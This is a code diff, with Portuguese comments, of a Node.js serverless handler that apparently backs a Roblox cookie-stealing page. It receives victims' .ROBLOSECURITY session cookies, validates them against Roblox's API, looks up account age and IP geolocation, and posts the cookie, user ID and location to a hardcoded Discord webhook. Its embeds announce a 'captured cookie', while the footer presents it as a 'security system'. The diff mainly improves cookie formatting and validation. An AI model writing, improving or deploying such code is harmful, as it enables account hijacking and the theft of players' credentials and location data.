@@ -15,41 +15,80 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { cookie, ip, device, timestamp } = req.body;
+    let { cookie, ip, device, timestamp } = req.body;
 
     // Validar dados básicos
-    if (!cookie || cookie.length < 50) {
-      return res.status(400).json({ error: 'Cookie inválido' });
+    if (!cookie) {
+      return res.status(400).json({ error: 'Cookie não fornecido' });
     }
+
+    // ===== CORREÇÃO: FORMATAR O COOKIE CORRETAMENTE =====
+    let cookieOriginal = cookie;
+    let cookieFormatado = cookie;
+    
+    // Se o cookie NÃO começa com _|WARNING, adicionar o formato correto
+    if (!cookie.startsWith('_|WARNING') && !cookie.startsWith('WARNING')) {
+      // Verificar se é apenas o token (formato que você está testando)
+      if (cookie.length > 100 && !cookie.includes('WARNING')) {
+        cookieFormatado = `_|WARNING:-DO-NOT-SHARE-THIS.--${cookie}`;
+        console.log('Cookie formatado automaticamente');
+      }
+    }
+
+    // Limpar o cookie (remover aspas, espaços)
+    cookieFormatado = cookieFormatado.trim().replace(/^["']|["']$/g, '');
 
     // ===== VERIFICAÇÃO DO COOKIE COM ROBLOX =====
     let cookieValido = true;
     let contaRecente = false;
     let username = 'Desconhecido';
+    let userId = null;
     let idadeConta = 'Desconhecida';
     let erroValidacao = null;
 
     try {
-      // Fazer requisição para a API do Roblox para verificar o cookie
+      console.log('Verificando cookie com Roblox...');
+      
+      // Tentar com o cookie original primeiro
       const robloxResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+        method: 'GET',
         headers: {
-          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'Cookie': `.ROBLOSECURITY=${cookieOriginal}`,
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
       });
 
-      if (!robloxResponse.ok) {
-        cookieValido = false;
-        if (robloxResponse.status === 401) {
-          erroValidacao = 'Cookie expirado ou inválido';
+      let responseData = null;
+      
+      if (robloxResponse.ok) {
+        responseData = await robloxResponse.json();
+      } else {
+        // Se falhou, tentar com o cookie formatado
+        console.log('Tentando com cookie formatado...');
+        const robloxResponse2 = await fetch('https://users.roblox.com/v1/users/authenticated', {
+          method: 'GET',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookieFormatado}`,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+          }
+        });
+
+        if (robloxResponse2.ok) {
+          responseData = await robloxResponse2.json();
+          cookieOriginal = cookieFormatado; // Usar o formatado daqui pra frente
         }
+      }
+
+      if (!responseData) {
+        cookieValido = false;
+        erroValidacao = 'Cookie inválido ou expirado';
       } else {
         // Cookie válido - buscar informações da conta
-        const userData = await robloxResponse.json();
-        username = userData.name || 'Desconhecido';
+        username = responseData.name || 'Desconhecido';
+        userId = responseData.id;
         
         // Buscar data de criação da conta
-        const userInfoResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
+        const userInfoResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
         if (userInfoResponse.ok) {
           const userInfo = await userInfoResponse.json();
           
@@ -95,23 +134,26 @@ export default async function handler(req, res) {
     const webhookURL = 'https://canary.discord.com/api/webhooks/1480235860002734152/8ZjlQOiaHtPrE9bz-yGaM_GiMC3akI7ptVW-aElQUvTjsk8jauXoaho6B1anWmy8a8QE';
 
     // Determinar cor e título baseado na validação
-    let embedColor = 0x6366f1; // Azul padrão
+    let embedColor = 0x6366f1;
     let embedTitle = '🔐 **NOVA CAPTURA DE COOKIE**';
     let embedDescription = 'Um novo cookie foi capturado pelo sistema Aurora';
     let embedContent = null;
 
     if (!cookieValido) {
-      embedColor = 0xff0000; // Vermelho
-      embedTitle = '❌ **COOKIE INVÁLIDO DETECTADO**';
+      embedColor = 0xff0000;
+      embedTitle = '❌ **COOKIE INVÁLIDO**';
       embedDescription = `Cookie inválido: ${erroValidacao || 'Não foi possível validar'}`;
     } else if (contaRecente) {
-      embedColor = 0xffa500; // Laranja
-      embedTitle = '⚠️ **CONTA RECENTE DETECTADA**';
+      embedColor = 0xffa500;
+      embedTitle = '⚠️ **CONTA RECENTE**';
       embedDescription = `Cookie válido mas a conta tem apenas ${idadeConta}`;
       embedContent = '@everyone ⚠️ CONTA RECENTE';
     } else {
       embedContent = '@everyone ✅ COOKIE VÁLIDO';
     }
+
+    // Mostrar o cookie que foi usado (original ou formatado)
+    const cookieExibido = cookieOriginal || cookie;
 
     const embed = {
       content: embedContent,
@@ -121,13 +163,14 @@ export default async function handler(req, res) {
         color: embedColor,
         fields: [
           {
-            name: '🍪 **COOKIE COMPLETO**',
-            value: '```' + cookie + '```'
+            name: '🍪 **COOKIE**',
+            value: '```' + cookieExibido.substring(0, 100) + '...```'
           },
           {
             name: '👤 **INFORMAÇÕES DA CONTA**',
             value: `\`\`\`yml
 Username: ${username}
+User ID: ${userId || 'Desconhecido'}
 Status: ${cookieValido ? '✅ Válido' : '❌ Inválido'}
 Conta Recente: ${contaRecente ? '⚠️ Sim' : '✅ Não'}
 Idade da Conta: ${idadeConta}
@@ -149,62 +192,44 @@ IP: ${ip}
 País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
 Região: ${ipInfo.regionName || 'Desconhecido'}
 Cidade: ${ipInfo.city || 'Desconhecido'}
-CEP: ${ipInfo.zip || 'Desconhecido'}
-Latitude: ${ipInfo.lat || 'Desconhecido'}
-Longitude: ${ipInfo.lon || 'Desconhecido'}
-Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
 Provedor: ${ipInfo.isp || 'Desconhecido'}
-Organização: ${ipInfo.org || 'Desconhecido'}
-Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
 Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
-Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
 \`\`\``
           },
           {
             name: '⏰ **TIMESTAMP**',
-            value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
+            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
             inline: true
           },
           {
-            name: '🔢 **ID DA SESSÃO**',
-            value: `\`${generateSessionId()}\``,
-            inline: true
-          },
-          {
-            name: '📏 **TAMANHO DO COOKIE**',
-            value: `\`${cookie.length} caracteres\``,
+            name: '📏 **TAMANHO**',
+            value: `\`${cookieExibido.length} caracteres\``,
             inline: true
           }
         ],
         footer: {
-          text: 'Aurora Security System • Proteção Avançada',
-          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
+          text: 'Aurora Security System',
+          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
         },
-        timestamp: new Date().toISOString(),
-        thumbnail: {
-          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif?ex=69a835f5&is=69a6e475&hm=47008cff92b32b165301e19e2f528da6f4b03f42900a8401c989976a082459cd&=&width=569&height=320'
-        }
+        timestamp: new Date().toISOString()
       }]
     };
 
     // Enviar para o Discord
-    const response = await fetch(webhookURL, {
+    await fetch(webhookURL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(embed)
     });
 
-    if (!response.ok) {
-      throw new Error('Falha ao enviar para Discord');
-    }
-
-    // Retornar resultado da verificação para o frontend
+    // Retornar resultado para o frontend
     return res.status(200).json({ 
       success: true,
       valido: cookieValido,
       contaRecente: contaRecente,
       username: username,
-      idadeConta: idadeConta
+      idadeConta: idadeConta,
+      userId: userId
     });
     
   } catch (error) {
@@ -220,24 +245,15 @@ function getBrowserInfo(req) {
   if (ua.includes('Firefox')) return 'Mozilla Firefox';
   if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
   if (ua.includes('Edg')) return 'Microsoft Edge';
-  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
   return 'Desconhecido';
 }
 
 function getOSInfo(req) {
   const ua = req.headers['user-agent'] || '';
-  if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
-  if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
-  if (ua.includes('Windows NT 6.2')) return 'Windows 8';
-  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
-  if (ua.includes('Mac OS X')) return 'macOS';
-  if (ua.includes('Linux') && !ua.includes('Android')) return 'Linux';
+  if (ua.includes('Windows')) return 'Windows';
+  if (ua.includes('Mac')) return 'macOS';
+  if (ua.includes('Linux')) return 'Linux';
   if (ua.includes('Android')) return 'Android';
   if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
   return 'Desconhecido';
-}
-
-function generateSessionId() {
-  return Math.random().toString(36).substring(2, 15) + 
-         Math.random().toString(36).substring(2, 15);
 }
